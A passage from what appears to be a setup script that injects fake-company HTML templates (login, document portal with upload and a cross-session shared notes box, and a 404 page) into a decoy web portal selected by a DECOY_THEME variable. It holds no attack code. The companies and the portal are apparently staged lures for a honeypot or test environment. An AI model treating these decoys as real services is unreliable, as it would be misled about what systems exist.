        .drop-overlay .drop-icon { font-size: 2.5em; margin-bottom: 12px; }
        .modal-backdrop {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.45);
            z-index: 500;
            align-items: center;
            justify-content: center;
        }
        .modal-backdrop.active { display: flex; }
        .modal {
            background: #fff;
            border: 1px solid #ddd;
            padding: 28px 32px;
            max-width: 400px;
            width: 90%;
        }
        .modal h3 {
            font-family: Georgia, 'Times New Roman', Times, serif;
            font-weight: 400;
            margin-bottom: 12px;
            color: #0a1628;
        }
        .modal p { font-size: 0.9em; color: #555; margin-bottom: 20px; }
        .modal-actions {
            display: flex;
            justify-content: flex-end;
            gap: 10px;
        }
        .modal-actions button {
            padding: 8px 20px;
            font-size: 0.82em;
            cursor: pointer;
            border: 1px solid #ccc;
            background: #fff;
            color: #555;
            transition: background 0.2s;
        }
        .modal-actions button:hover { background: #f5f4f0; }
        .modal-actions .btn-confirm-delete {
            background: #d9534f;
            color: #fff;
            border-color: #d9534f;
        }
        .modal-actions .btn-confirm-delete:hover { background: #c9302c; }
        .toast {
            position: fixed;
            bottom: 24px;
            right: 24px;
            background: #0a1628;
            color: #e8e4d9;
            padding: 12px 20px;
            font-size: 0.85em;
            z-index: 600;
            opacity: 0;
            transform: translateY(10px);
            transition: opacity 0.3s, transform 0.3s;
            max-width: 360px;
        }
        .toast.visible { opacity: 1; transform: translateY(0); }
        .toast.error { border-left: 3px solid #d9534f; }
        .toast.success { border-left: 3px solid #8b7535; }
        .clipboard-section {
            margin-top: 20px;
            border: 1px solid #ddd;
            background: #fff;
        }
        .clipboard-header {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px 14px;
            background: #0a1628;
            cursor: pointer;
            user-select: none;
        }
        .clipboard-header span:first-child {
            color: #c9b06b;
            font-size: 0.85em;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            font-weight: 600;
        }
        .clipboard-header button {
            background: none;
            border: 1px solid rgba(255,255,255,0.3);
            color: #b0b8c4;
            padding: 3px 12px;
            font-size: 0.85em;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-radius: 3px;
            transition: background 0.15s, border-color 0.15s, color 0.15s;
        }
        .clipboard-header button:hover {
            background: rgba(255,255,255,0.1);
            border-color: rgba(255,255,255,0.5);
            color: #fff;
        }
        .clipboard-header button:active {
            background: rgba(255,255,255,0.2);
            color: #fff;
        }
        .clipboard-status {
            color: #b0b8c4;
            font-size: 0.85em;
        }
        .clipboard-expand-hint {
            color: #6a7080;
            font-size: 0.85em;
            margin-left: auto;
        }
        .clipboard-body.open ~ .clipboard-expand-hint,
        .clipboard-body.open + .clipboard-expand-hint { display: none; }
        .clipboard-body.open { display: block; }
        .clipboard-textarea {
            width: 100%;
            min-height: 220px;
            padding: 12px 14px;
            border: none;
            font-family: 'SF Mono', Monaco, Consolas, monospace;
            font-size: 0.85em;
            resize: vertical;
            outline: none;
            color: #333;
            background: #fafaf8;
        }
        .clipboard-textarea:focus { background: #fff; }
        @media (max-width: 768px) {
            .sidebar { display: none; }
            .content { padding: 16px; }
            .topbar-title { display: none; }
        }
    </style>
</head>
<body>
    <header class="topbar">
        <div class="topbar-left">
            <span class="topbar-logo">Meridian Financial Group</span>
            <span class="topbar-title">Document Portal</span>
        </div>
        <div class="topbar-right">
            <a href="/portal/logout">Sign Out</a>
        </div>
    </header>
    <div class="layout">
        <aside class="sidebar">
            <div class="sidebar-header">Folders</div>
            <ul class="folder-list" id="folder-list"></ul>
            <button class="btn-new-folder" id="btn-new-folder">+ New Folder</button>
        </aside>
        <main class="content">
            <div class="content-header">
                <h2 id="current-folder-title">Documents</h2>
                <div>
                    <input type="file" class="file-input" id="file-input" multiple>
                    <button class="btn-browse" id="btn-browse">Browse Files</button>
                </div>
            </div>
            <div class="upload-progress" id="upload-progress">
                <div class="progress-bar-outer"><div class="progress-bar-inner" id="progress-bar"></div></div>
                <div class="progress-text" id="progress-text">Uploading...</div>
            </div>
            <div class="file-table-wrap" id="file-table-wrap">
                <div class="drop-overlay" id="drop-overlay">
                    <div class="drop-icon">&uarr;</div>
                    <div>Drop files here to upload</div>
                </div>
                <table class="file-table" id="file-table">
                    <thead>
                        <tr>
                            <th data-sort="name">Name <span class="sort-arrow"></span></th>
                            <th data-sort="size">Size <span class="sort-arrow"></span></th>
                            <th data-sort="modified">Modified <span class="sort-arrow"></span></th>
                            <th style="width: 80px;"></th>
                        </tr>
                    </thead>
                    <tbody id="file-tbody"></tbody>
                </table>
            </div>
            <div class="clipboard-section">
                <div class="clipboard-header" id="clipboard-toggle">
                    <span>Shared Notes</span>
                    <button onclick="event.stopPropagation(); (typeof pullClipboard !== 'undefined') && pullClipboard();">Pull</button>
                    <button onclick="event.stopPropagation(); (typeof pushClipboard !== 'undefined') && pushClipboard();">Push</button>
                    <span class="clipboard-status" id="clipboard-status"></span>
                    <span class="clipboard-expand-hint" id="clipboard-expand-hint" style="margin-left: auto; display: none;">click to expand</span>
                </div>
                <div class="clipboard-body open" id="clipboard-body">
                    <textarea class="clipboard-textarea" id="clipboard-text" placeholder="Paste text here — shared across all sessions in real time..."></textarea>
                </div>
            </div>
        </main>
    </div>
    <div class="modal-backdrop" id="delete-modal">
        <div class="modal">
            <h3>Confirm Deletion</h3>
            <p>Are you sure you want to delete <strong id="delete-filename"></strong>?</p>
            <div class="modal-actions">
                <button id="btn-cancel-delete">Cancel</button>
                <button class="btn-confirm-delete" id="btn-confirm-delete">Delete</button>
            </div>
        </div>
    </div>
    <div class="toast" id="toast"></div>
    <script>
    (function() {
        var csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
        var currentFolder = 'upload';
        var currentSort = 'modified';
        var sortAsc = false;
        var pendingDelete = null;

        function showToast(msg, type) {
            var t = document.getElementById('toast');
            t.textContent = msg;
            t.className = 'toast ' + (type || 'success') + ' visible';
            setTimeout(function() { t.className = 'toast'; }, 3500);
        }

        function apiFetch(url, opts) {
            opts = opts || {};
            opts.headers = opts.headers || {};
            opts.headers['X-CSRF-Token'] = csrfToken;
            return fetch(url, opts).then(function(r) {
                if (r.status === 401) { window.location.href = '/login'; return Promise.reject('auth'); }
                return r;
            });
        }

        function loadFolders() {
            fetch('/portal/api/folders').then(function(r) { return r.json(); }).then(function(data) {
                var list = document.getElementById('folder-list');
                list.innerHTML = '';
                (data.folders || []).forEach(function(name) {
                    var li = document.createElement('li');
                    li.textContent = name;
                    if (name === currentFolder) li.className = 'active';
                    li.addEventListener('click', function() { currentFolder = name; loadFolders(); loadFiles(); });
                    list.appendChild(li);
                });
            });
        }

        function loadFiles() {
            document.getElementById('current-folder-title').textContent = currentFolder;
            fetch('/portal/api/files?folder=' + encodeURIComponent(currentFolder) + '&sort=' + currentSort)
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    var tbody = document.getElementById('file-tbody');
                    tbody.innerHTML = '';
                    var files = data.files || [];
                    if (files.length === 0) {
                        tbody.innerHTML = '<tr><td colspan="4" class="empty-state">No files in this folder</td></tr>';
                        return;
                    }
                    files.forEach(function(f) {
                        var tr = document.createElement('tr');
                        var tdName = document.createElement('td');
                        var a = document.createElement('a');
                        a.className = 'file-name-link';
                        a.href = '/portal/api/download/' + encodeURIComponent(currentFolder) + '/' + encodeURIComponent(f.name);
                        a.textContent = f.name;
                        tdName.appendChild(a);

                        var tdSize = document.createElement('td');
                        tdSize.textContent = f.size_human;

                        var tdMod = document.createElement('td');
                        var d = new Date(f.modified * 1000);
                        tdMod.textContent = d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], {hour: '2-digit', minute: '2-digit'});

                        var tdAct = document.createElement('td');
                        var btn = document.createElement('button');
                        btn.className = 'btn-delete';
                        btn.textContent = 'Delete';
                        btn.addEventListener('click', function() {
                            pendingDelete = { folder: currentFolder, name: f.name };
                            document.getElementById('delete-filename').textContent = f.name;
                            document.getElementById('delete-modal').className = 'modal-backdrop active';
                        });
                        tdAct.appendChild(btn);

                        tr.appendChild(tdName);
                        tr.appendChild(tdSize);
                        tr.appendChild(tdMod);
                        tr.appendChild(tdAct);
                        tbody.appendChild(tr);
                    });
                });
        }

        function uploadFiles(files) {
            if (!files || files.length === 0) return;
            var formData = new FormData();
            formData.append('folder', currentFolder);
            for (var i = 0; i < files.length; i++) {
                formData.append('file' + i, files[i]);
            }
            var progWrap = document.getElementById('upload-progress');
            var progBar = document.getElementById('progress-bar');
            var progText = document.getElementById('progress-text');
            progWrap.style.display = 'block';
            progBar.style.width = '0%';
            progText.textContent = 'Uploading...';

            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/portal/api/upload');
            xhr.setRequestHeader('X-CSRF-Token', csrfToken);
            xhr.upload.addEventListener('progress', function(e) {
                if (e.lengthComputable) {
                    var pct = Math.round((e.loaded / e.total) * 100);
                    progBar.style.width = pct + '%';
                    progText.textContent = 'Uploading... ' + pct + '%';
                }
            });
            xhr.addEventListener('load', function() {
                progWrap.style.display = 'none';
                if (xhr.status === 201) {
                    var resp = JSON.parse(xhr.responseText);
                    showToast('Uploaded ' + (resp.uploaded || []).length + ' file(s)', 'success');
                    loadFiles();
                } else {
                    var err = 'Upload failed';
                    try { err = JSON.parse(xhr.responseText).error || err; } catch(e) {}
                    showToast(err, 'error');
                }
            });
            xhr.addEventListener('error', function() {
                progWrap.style.display = 'none';
                showToast('Upload failed', 'error');
            });
            xhr.send(formData);
        }

        // Sort headers
        document.querySelectorAll('.file-table thead th[data-sort]').forEach(function(th) {
            th.addEventListener('click', function() {
                var newSort = th.getAttribute('data-sort');
                if (newSort === currentSort) { sortAsc = !sortAsc; } else { currentSort = newSort; sortAsc = true; }
                document.querySelectorAll('.file-table thead th .sort-arrow').forEach(function(s) { s.textContent = ''; });
                th.querySelector('.sort-arrow').textContent = sortAsc ? ' \u25B2' : ' \u25BC';
                loadFiles();
            });
        });

        // Browse button
        document.getElementById('btn-browse').addEventListener('click', function() {
            document.getElementById('file-input').click();
        });
        document.getElementById('file-input').addEventListener('change', function(e) {
            uploadFiles(e.target.files);
            e.target.value = '';
        });

        // Drag and drop
        var wrap = document.getElementById('file-table-wrap');
        var overlay = document.getElementById('drop-overlay');
        var dragCounter = 0;
        wrap.addEventListener('dragenter', function(e) {
            e.preventDefault();
            dragCounter++;
            overlay.style.display = 'flex';
        });
        wrap.addEventListener('dragleave', function(e) {
            e.preventDefault();
            dragCounter--;
            if (dragCounter <= 0) { overlay.style.display = 'none'; dragCounter = 0; }
        });
        wrap.addEventListener('dragover', function(e) { e.preventDefault(); });
        wrap.addEventListener('drop', function(e) {
            e.preventDefault();
            dragCounter = 0;
            overlay.style.display = 'none';
            uploadFiles(e.dataTransfer.files);
        });

        // New folder
        document.getElementById('btn-new-folder').addEventListener('click', function() {
            var name = prompt('Folder name (alphanumeric, hyphens, underscores):');
            if (!name) return;
            apiFetch('/portal/api/folders', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name: name })
            }).then(function(r) { return r.json(); }).then(function(data) {
                if (data.ok) { showToast('Folder created', 'success'); currentFolder = name; loadFolders(); loadFiles(); }
                else { showToast(data.error || 'Failed', 'error'); }
            }).catch(function() { showToast('Failed to create folder', 'error'); });
        });

        // Delete modal
        document.getElementById('btn-cancel-delete').addEventListener('click', function() {
            document.getElementById('delete-modal').className = 'modal-backdrop';
            pendingDelete = null;
        });
        document.getElementById('btn-confirm-delete').addEventListener('click', function() {
            if (!pendingDelete) return;
            var folder = pendingDelete.folder;
            var name = pendingDelete.name;
            document.getElementById('delete-modal').className = 'modal-backdrop';
            apiFetch('/portal/api/files/' + encodeURIComponent(folder) + '/' + encodeURIComponent(name), {
                method: 'DELETE'
            }).then(function(r) { return r.json(); }).then(function(data) {
                if (data.ok) { showToast('File deleted', 'success'); loadFiles(); }
                else { showToast(data.error || 'Failed', 'error'); }
            }).catch(function() { showToast('Failed to delete file', 'error'); });
            pendingDelete = null;
        });

        // Shared clipboard — manual Push/Pull only
        var clipboardEl = document.getElementById('clipboard-text');
        var clipboardStatus = document.getElementById('clipboard-status');

        document.getElementById('clipboard-toggle').addEventListener('click', function() {
            var body = document.getElementById('clipboard-body');
            var hint = document.getElementById('clipboard-expand-hint');
            body.classList.toggle('open');
            if (hint) hint.style.display = body.classList.contains('open') ? 'none' : 'inline';
        });

        function pullClipboard() {
            clipboardStatus.textContent = 'pulling...';
            fetch('/portal/api/clipboard').then(function(r) { return r.json(); }).then(function(data) {
                clipboardEl.value = data.text || '';
                clipboardStatus.textContent = data.updated_at > 0 ? 'pulled' : 'empty';
            }).catch(function() { clipboardStatus.textContent = 'pull failed'; });
        }

        function pushClipboard() {
            clipboardStatus.textContent = 'pushing...';
            apiFetch('/portal/api/clipboard', {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ text: clipboardEl.value })
            }).then(function(r) { return r.json(); }).then(function(data) {
                clipboardStatus.textContent = 'pushed';
            }).catch(function() { clipboardStatus.textContent = 'push failed'; });
        }

        window.pullClipboard = pullClipboard;
        window.pushClipboard = pushClipboard;

        // Init
        loadFolders();
        loadFiles();
    })();
    </script>
</body>
</html>"""

ERROR_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page Not Found | Meridian Financial Group</title>
    <style>
        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Georgia, 'Times New Roman', Times, serif;
            background: #f5f4f0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            background: #0a1628;
            padding: 16px 0;
            border-bottom: 3px solid #8b7535;
        }
        .header-inner {
            max-width: 1000px;
            margin: 0 auto;
            padding: 0 20px;
        }
        .logo {
            color: #c9b06b;
            font-size: 1.35em;
            font-weight: 400;
            letter-spacing: 1px;
        }
        .main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
            text-align: center;
        }
        .error-card {
            max-width: 440px;
        }
        .error-card h1 {
            font-size: 1.6em;
            font-weight: 400;
            color: #0a1628;
            margin-bottom: 12px;
        }
        .error-card p {
            color: #6b6b6b;
            font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif;
            font-size: 0.92em;
            margin-bottom: 28px;
            line-height: 1.6;
        }
        .error-card a {
            display: inline-block;
            padding: 10px 32px;
            background: #8b7535;
            color: #fff;
            text-decoration: none;
            font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif;
            font-size: 0.82em;
            letter-spacing: 1px;
            text-transform: uppercase;
            transition: background 0.3s;
        }
        .error-card a:hover { background: #a08940; }
        .footer {
            background: #0a1628;
            color: #5a6474;
            text-align: center;
            padding: 16px 20px;
            font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif;
            font-size: 0.78em;
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-inner">
            <span class="logo">Meridian Financial Group</span>
        </div>
    </header>
    <main class="main">
        <div class="error-card">
            <h1>Page Not Found</h1>
            <p>The page you are looking for could not be found. Please check the URL or return to the home page.</p>
            <a href="/login">Return to Login</a>
        </div>
    </main>
    <footer class="footer">
        <p>&copy; 2024 Meridian Financial Group. All rights reserved.</p>
    </footer>
</body>
</html>"""

content = content.replace("PLACEHOLDER_LOGIN_TEMPLATE", LOGIN_HTML)
content = content.replace("PLACEHOLDER_PORTAL_TEMPLATE", PORTAL_HTML)
content = content.replace("PLACEHOLDER_ERROR_TEMPLATE", ERROR_HTML)

with open('/opt/portal/app.py', 'w') as f:
    f.write(content)
print("Meridian Financial templates injected")
TEMPLATEEOF

    elif [ "$DECOY_THEME" = "plexura" ]; then
        python3 << 'TEMPLATEEOF'
# Read app.py and replace placeholder template strings with Plexura themed HTML
with open('/opt/portal/app.py') as f:
    content = f.read()

LOGIN_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Client Portal | Plexura Managed Solutions</title>
    <style>
        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            padding: 16px 0;
        }
        .header-inner {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            align-items: center;
        }
        .logo {
            color: #fff;
            font-size: 1.5em;
            font-weight: 700;
            text-decoration: none;
        }
        .logo span { color: #4a9eff; }
        .main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }
        .login-card {
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
            width: 100%;
            max-width: 400px;
            padding: 48px 36px 40px;
        }
        .login-card h1 {
            font-size: 1.4em;
            font-weight: 700;
            color: #1a1a2e;
            margin-bottom: 4px;
        }
        .login-card .subtitle {
            color: #666;
            font-size: 0.92em;
            margin-bottom: 28px;
        }
        .login-error {
            background: #fef2f2;
            border: 1px solid #f5c6cb;
            border-radius: 5px;
            color: #842029;
            padding: 10px 14px;
            font-size: 0.85em;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 18px;
        }
        .form-group label {
            display: block;
            font-size: 0.85em;
            color: #555;
            margin-bottom: 6px;
            font-weight: 500;
        }
        .form-group input {
            width: 100%;
            padding: 11px 14px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 0.95em;
            color: #333;
            background: #f8f9fa;
            transition: border-color 0.2s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #4a9eff;
            box-shadow: 0 0 0 3px rgba(74,158,255,0.12);
        }
        .btn-login {
            width: 100%;
            padding: 12px;
            background: #4a9eff;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 0.95em;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn-login:hover {
            background: #3a8eef;
        }
        .footer {
            background: #1a1a2e;
            color: #666;
            text-align: center;
            padding: 16px 20px;
            font-size: 0.8em;
        }
        @media (max-width: 480px) {
            .login-card { padding: 32px 24px 28px; }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-inner">
            <span class="logo">Plexura<span>MS</span></span>
        </div>
    </header>
    <main class="main">
        <div class="login-card">
            <h1>Plexura Managed Solutions</h1>
            <p class="subtitle">Client Portal</p>
            {% if error %}<div class="login-error">Invalid credentials. Please try again.</div>{% endif %}
            <form method="POST" action="/login">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" required autocomplete="username" autofocus>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required autocomplete="current-password">
                </div>
                <button type="submit" class="btn-login">Sign In</button>
            </form>
        </div>
    </main>
    <footer class="footer">
        <p>&copy; 2024 Plexura Managed Solutions. All rights reserved.</p>
    </footer>
</body>
</html>"""

PORTAL_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token }}">
    <title>Document Portal | Plexura Managed Solutions</title>
    <style>
        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #f8f9fa;
            color: #333;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .topbar {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            padding: 0 20px;
            height: 56px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .topbar-left {
            display: flex;
            align-items: center;
            gap: 18px;
        }
        .topbar-logo {
            color: #fff;
            font-size: 1.25em;
            font-weight: 700;
        }
        .topbar-logo span { color: #4a9eff; }
        .topbar-title {
            color: #aaa;
            font-size: 0.88em;
        }
        .topbar-right a {
            color: #aaa;
            text-decoration: none;
            font-size: 0.85em;
            transition: color 0.2s;
        }
        .topbar-right a:hover { color: #fff; }
        .layout {
            flex: 1;
            display: flex;
            min-height: 0;
        }
        .sidebar {
            width: 240px;
            background: #fff;
            border-right: 1px solid #e8e8e8;
            padding: 20px 0;
            flex-shrink: 0;
            overflow-y: auto;
        }
        .sidebar-header {
            padding: 0 18px 14px;
            font-size: 0.72em;
            letter-spacing: 1px;
            text-transform: uppercase;
            color: #999;
            border-bottom: 1px solid #eee;
            margin-bottom: 6px;
            font-weight: 600;
        }
        .folder-list {
            list-style: none;
        }
        .folder-list li {
            padding: 10px 18px;
            cursor: pointer;
            font-size: 0.9em;
            color: #555;
            transition: background 0.15s;
            border-left: 3px solid transparent;
            border-radius: 0;
        }
        .folder-list li:hover { background: #f0f4ff; }
        .folder-list li.active {
            background: #f0f4ff;
            color: #1a1a2e;
            font-weight: 600;
            border-left-color: #4a9eff;
        }
        .folder-list li::before {
            content: "\1F4C1 ";
            margin-right: 6px;
        }
        .btn-new-folder {
            display: block;
            margin: 14px 18px 0;
            padding: 8px 0;
            background: none;
            border: 1px dashed #ccc;
            border-radius: 5px;
            color: #888;
            font-size: 0.82em;
            cursor: pointer;
            text-align: center;
            transition: border-color 0.2s, color 0.2s;
        }
        .btn-new-folder:hover { border-color: #4a9eff; color: #4a9eff; }
        .content {
            flex: 1;
            padding: 24px 28px;
            min-width: 0;
            display: flex;
            flex-direction: column;
        }
        .content-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .content-header h2 {
            font-size: 1.3em;
            font-weight: 700;
            color: #1a1a2e;
        }
        .btn-browse {
            padding: 9px 22px;
            background: #4a9eff;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 0.85em;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-browse:hover { background: #3a8eef; }
        .file-input { display: none; }
        .upload-progress {
            display: none;
            margin-bottom: 16px;
        }
        .progress-bar-outer {
            background: #e8e8e8;
            height: 6px;
            border-radius: 3px;
            width: 100%;
            overflow: hidden;
        }
        .progress-bar-inner {
            background: #4a9eff;
            height: 100%;
            width: 0%;
            border-radius: 3px;
            transition: width 0.2s;
        }
        .progress-text {
            font-size: 0.78em;
            color: #888;
            margin-top: 4px;
        }
        .file-table-wrap {
            flex: 1;
            position: relative;
            overflow: auto;
        }
        .file-table {
            width: 100%;
            border-collapse: collapse;
            background: #fff;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
        }
        .file-table thead th {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #ccc;
            padding: 11px 14px;
            text-align: left;
            font-size: 0.78em;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            font-weight: 600;
            cursor: pointer;
            user-select: none;
            white-space: nowrap;
        }
        .file-table thead th:hover { color: #fff; }
        .file-table thead th .sort-arrow { margin-left: 4px; font-size: 0.8em; }
        .file-table tbody td {
            padding: 11px 14px;
            border-bottom: 1px solid #f0f0f0;
            font-size: 0.88em;
        }
        .file-table tbody tr:hover { background: #f8faff; }
        .file-name-link {
            color: #1a1a2e;
            text-decoration: none;
            font-weight: 500;
        }
        .file-name-link:hover { color: #4a9eff; text-decoration: underline; }
        .btn-delete {
            background: none;
            border: 1px solid #e74c3c;
            color: #e74c3c;
            padding: 4px 10px;
            border-radius: 4px;
            font-size: 0.78em;
            cursor: pointer;
            transition: background 0.2s, color 0.2s;
        }
        .btn-delete:hover { background: #e74c3c; color: #fff; }
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #999;
            font-size: 0.95em;
        }
        .drop-overlay {
            display: none;
            position: absolute;
            inset: 0;
            background: rgba(26, 26, 46, 0.88);
            border-radius: 8px;
            z-index: 100;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: #4a9eff;
            font-size: 1.3em;
            font-weight: 600;
            pointer-events: none;
        }
        .drop-overlay .drop-icon { font-size: 2.5em; margin-bottom: 12px; }
        .modal-backdrop {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.4);
            z-index: 500;
            align-items: center;
            justify-content: center;
        }
        .modal-backdrop.active { display: flex; }
        .modal {
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
            padding: 28px 32px;
            max-width: 400px;
            width: 90%;
        }
        .modal h3 {
            font-weight: 700;
            margin-bottom: 12px;
            color: #1a1a2e;
        }
        .modal p { font-size: 0.9em; color: #555; margin-bottom: 20px; }
        .modal-actions {
            display: flex;
            justify-content: flex-end;
            gap: 10px;
        }
        .modal-actions button {
            padding: 8px 20px;
            font-size: 0.85em;
            cursor: pointer;
            border: 1px solid #ddd;
            border-radius: 5px;
            background: #fff;
            color: #555;
            transition: background 0.2s;
        }
        .modal-actions button:hover { background: #f8f9fa; }
        .modal-actions .btn-confirm-delete {
            background: #e74c3c;
            color: #fff;
            border-color: #e74c3c;
        }
        .modal-actions .btn-confirm-delete:hover { background: #c0392b; }
        .toast {
            position: fixed;
            bottom: 24px;
            right: 24px;
            background: #1a1a2e;
            color: #eee;
            padding: 12px 20px;
            border-radius: 6px;
            font-size: 0.85em;
            z-index: 600;
            opacity: 0;
            transform: translateY(10px);
            transition: opacity 0.3s, transform 0.3s;
            max-width: 360px;
        }
        .toast.visible { opacity: 1; transform: translateY(0); }
        .toast.error { border-left: 3px solid #e74c3c; }
        .toast.success { border-left: 3px solid #4a9eff; }
        .clipboard-section {
            margin-top: 20px;
            border: 1px solid #ddd;
            background: #fff;
        }
        .clipboard-header {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px 14px;
            background: #1a1a2e;
            cursor: pointer;
            user-select: none;
        }
        .clipboard-header span:first-child {
            color: #4a9eff;
            font-size: 0.85em;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            font-weight: 600;
        }
        .clipboard-header button {
            background: none;
            border: 1px solid rgba(255,255,255,0.3);
            color: #b0b8c4;
            padding: 3px 12px;
            font-size: 0.85em;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-radius: 3px;
            transition: background 0.15s, border-color 0.15s, color 0.15s;
        }
        .clipboard-header button:hover {
            background: rgba(255,255,255,0.1);
            border-color: rgba(255,255,255,0.5);
            color: #fff;
        }
        .clipboard-header button:active {
            background: rgba(255,255,255,0.2);
            color: #fff;
        }
        .clipboard-status {
            color: #b0b8c4;
            font-size: 0.85em;
        }
        .clipboard-expand-hint {
            color: #6a7080;
            font-size: 0.85em;
            margin-left: auto;
        }
        .clipboard-body.open { display: block; }
        .clipboard-textarea {
            width: 100%;
            min-height: 220px;
            padding: 12px 14px;
            border: none;
            font-family: 'SF Mono', Monaco, Consolas, monospace;
            font-size: 0.85em;
            resize: vertical;
            outline: none;
            color: #333;
            background: #fafaf8;
        }
        .clipboard-textarea:focus { background: #fff; }
        @media (max-width: 768px) {
            .sidebar { display: none; }
            .content { padding: 16px; }
            .topbar-title { display: none; }
        }
    </style>
</head>
<body>
    <header class="topbar">
        <div class="topbar-left">
            <span class="topbar-logo">Plexura<span>MS</span></span>
            <span class="topbar-title">Document Portal</span>
        </div>
        <div class="topbar-right">
            <a href="/portal/logout">Sign Out</a>
        </div>
    </header>
    <div class="layout">
        <aside class="sidebar">
            <div class="sidebar-header">Folders</div>
            <ul class="folder-list" id="folder-list"></ul>
            <button class="btn-new-folder" id="btn-new-folder">+ New Folder</button>
        </aside>
        <main class="content">
            <div class="content-header">
                <h2 id="current-folder-title">Documents</h2>
                <div>
                    <input type="file" class="file-input" id="file-input" multiple>
                    <button class="btn-browse" id="btn-browse">Browse Files</button>
                </div>
            </div>
            <div class="upload-progress" id="upload-progress">
                <div class="progress-bar-outer"><div class="progress-bar-inner" id="progress-bar"></div></div>
                <div class="progress-text" id="progress-text">Uploading...</div>
            </div>
            <div class="file-table-wrap" id="file-table-wrap">
                <div class="drop-overlay" id="drop-overlay">
                    <div class="drop-icon">&uarr;</div>
                    <div>Drop files here to upload</div>
                </div>
                <table class="file-table" id="file-table">
                    <thead>
                        <tr>
                            <th data-sort="name">Name <span class="sort-arrow"></span></th>
                            <th data-sort="size">Size <span class="sort-arrow"></span></th>
                            <th data-sort="modified">Modified <span class="sort-arrow"></span></th>
                            <th style="width: 80px;"></th>
                        </tr>
                    </thead>
                    <tbody id="file-tbody"></tbody>
                </table>
            </div>
            <div class="clipboard-section">
                <div class="clipboard-header" id="clipboard-toggle">
                    <span>Shared Notes</span>
                    <button onclick="event.stopPropagation(); (typeof pullClipboard !== 'undefined') && pullClipboard();">Pull</button>
                    <button onclick="event.stopPropagation(); (typeof pushClipboard !== 'undefined') && pushClipboard();">Push</button>
                    <span class="clipboard-status" id="clipboard-status"></span>
                    <span class="clipboard-expand-hint" id="clipboard-expand-hint" style="margin-left: auto; display: none;">click to expand</span>
                </div>
                <div class="clipboard-body open" id="clipboard-body">
                    <textarea class="clipboard-textarea" id="clipboard-text" placeholder="Paste text here — shared across all sessions in real time..."></textarea>
                </div>
            </div>
        </main>
    </div>
    <div class="modal-backdrop" id="delete-modal">
        <div class="modal">
            <h3>Confirm Deletion</h3>
            <p>Are you sure you want to delete <strong id="delete-filename"></strong>?</p>
            <div class="modal-actions">
                <button id="btn-cancel-delete">Cancel</button>
                <button class="btn-confirm-delete" id="btn-confirm-delete">Delete</button>
            </div>
        </div>
    </div>
    <div class="toast" id="toast"></div>
    <script>
    (function() {
        var csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
